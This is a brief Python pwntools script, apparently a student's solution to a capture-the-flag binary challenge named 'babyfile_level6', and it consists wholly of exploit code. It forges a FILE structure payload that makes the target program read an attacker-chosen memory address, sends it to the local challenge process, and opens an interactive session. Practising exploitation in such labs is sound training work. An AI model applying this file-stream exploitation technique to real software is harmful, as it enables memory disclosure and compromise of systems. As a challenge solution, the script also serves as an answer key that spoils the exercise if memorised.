#Nagib Lakhdari 3si2
from pwn import *

# Set the architecture context to amd64
context.arch = 'amd64'

# Start the process for the challenge binary
p = process("/challenge/babyfile_level6")

# Create a file structure payload to read from the specified address
fs = FileStructure()
payload = fs.read(0x4041f8, 1000)

# Send the payload to the process
p.send(payload)

# Interact with the process to get the output
p.interactive()
